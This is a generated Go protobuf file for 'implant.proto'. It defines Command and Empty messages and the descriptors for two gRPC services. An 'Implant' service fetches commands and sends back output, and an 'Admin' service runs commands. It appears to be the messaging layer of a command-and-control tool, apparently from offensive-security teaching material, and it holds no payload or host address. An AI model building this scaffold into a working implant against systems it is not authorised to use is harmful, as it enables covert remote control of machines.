// versions:
// 	protoc-gen-go v1.36.11
// 	protoc        v3.21.12
// source: implant.proto

package grpcapi

import (
	reflect "reflect"
	sync "sync"
	unsafe "unsafe"

	protoreflect "google.golang.org/protobuf/reflect/protoreflect"
	protoimpl "google.golang.org/protobuf/runtime/protoimpl"
)

const (
	// Verify that this generated code is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(20 - protoimpl.MinVersion)
	// Verify that runtime/protoimpl is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(protoimpl.MaxVersion - 20)
)

// Command define a command with both input and output fields
type Command struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	In            string                 `protobuf:"bytes,1,opt,name=In,proto3" json:"In,omitempty"`
	Out           string                 `protobuf:"bytes,2,opt,name=Out,proto3" json:"Out,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *Command) Reset() {
	*x = Command{}
	mi := &file_implant_proto_msgTypes[0]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *Command) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*Command) ProtoMessage() {}

func (x *Command) ProtoReflect() protoreflect.Message {
	mi := &file_implant_proto_msgTypes[0]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use Command.ProtoReflect.Descriptor instead.
func (*Command) Descriptor() ([]byte, []int) {
	return file_implant_proto_rawDescGZIP(), []int{0}
}

func (x *Command) GetIn() string {
	if x != nil {
		return x.In
	}
	return ""
}

func (x *Command) GetOut() string {
	if x != nil {
		return x.Out
	}
	return ""
}

// Empty defines an empty message used in place of null
type Empty struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *Empty) Reset() {
	*x = Empty{}
	mi := &file_implant_proto_msgTypes[1]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *Empty) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*Empty) ProtoMessage() {}

func (x *Empty) ProtoReflect() protoreflect.Message {
	mi := &file_implant_proto_msgTypes[1]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use Empty.ProtoReflect.Descriptor instead.
func (*Empty) Descriptor() ([]byte, []int) {
	return file_implant_proto_rawDescGZIP(), []int{1}
}

var File_implant_proto protoreflect.FileDescriptor

const file_implant_proto_rawDesc = "" +
	"\n" +
	"\rimplant.proto\x12\agrpcapi\"+\n" +
	"\aCommand\x12\x0e\n" +
	"\x02In\x18\x01 \x01(\tR\x02In\x12\x10\n" +
	"\x03Out\x18\x02 \x01(\tR\x03Out\"\a\n" +
	"\x05Empty2k\n" +
	"\aImplant\x120\n" +
	"\fFetchCommand\x12\x0e.grpcapi.Empty\x1a\x10.grpcapi.Command\x12.\n" +
	"\n" +
	"SendOutput\x12\x10.grpcapi.Command\x1a\x0e.grpcapi.Empty29\n" +
	"\x05Admin\x120\n" +
	"\n" +
	"RunCommand\x12\x10.grpcapi.Command\x1a\x10.grpcapi.CommandB\x04Z\x02./b\x06proto3"

var (
	file_implant_proto_rawDescOnce sync.Once
	file_implant_proto_rawDescData []byte
)

func file_implant_proto_rawDescGZIP() []byte {
	file_implant_proto_rawDescOnce.Do(func() {
		file_implant_proto_rawDescData = protoimpl.X.CompressGZIP(unsafe.Slice(unsafe.StringData(file_implant_proto_rawDesc), len(file_implant_proto_rawDesc)))
	})
	return file_implant_proto_rawDescData
}

var file_implant_proto_msgTypes = make([]protoimpl.MessageInfo, 2)
var file_implant_proto_goTypes = []any{
	(*Command)(nil), // 0: grpcapi.Command
	(*Empty)(nil),   // 1: grpcapi.Empty
}
var file_implant_proto_depIdxs = []int32{
	1, // 0: grpcapi.Implant.FetchCommand:input_type -> grpcapi.Empty
	0, // 1: grpcapi.Implant.SendOutput:input_type -> grpcapi.Command
	0, // 2: grpcapi.Admin.RunCommand:input_type -> grpcapi.Command
	0, // 3: grpcapi.Implant.FetchCommand:output_type -> grpcapi.Command
	1, // 4: grpcapi.Implant.SendOutput:output_type -> grpcapi.Empty
	0, // 5: grpcapi.Admin.RunCommand:output_type -> grpcapi.Command
	3, // [3:6] is the sub-list for method output_type
	0, // [0:3] is the sub-list for method input_type
	0, // [0:0] is the sub-list for extension type_name
	0, // [0:0] is the sub-list for extension extendee
	0, // [0:0] is the sub-list for field type_name
}

func init() { file_implant_proto_init() }
func file_implant_proto_init() {
	if File_implant_proto != nil {
		return
	}
	type x struct{}
	out := protoimpl.TypeBuilder{
		File: protoimpl.DescBuilder{
			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
			RawDescriptor: unsafe.Slice(unsafe.StringData(file_implant_proto_rawDesc), len(file_implant_proto_rawDesc)),
			NumEnums:      0,
			NumMessages:   2,
			NumExtensions: 0,
			NumServices:   2,
		},
		GoTypes:           file_implant_proto_goTypes,
		DependencyIndexes: file_implant_proto_depIdxs,
		MessageInfos:      file_implant_proto_msgTypes,
	}.Build()
	File_implant_proto = out.File
	file_implant_proto_goTypes = nil
	file_implant_proto_depIdxs = nil
}
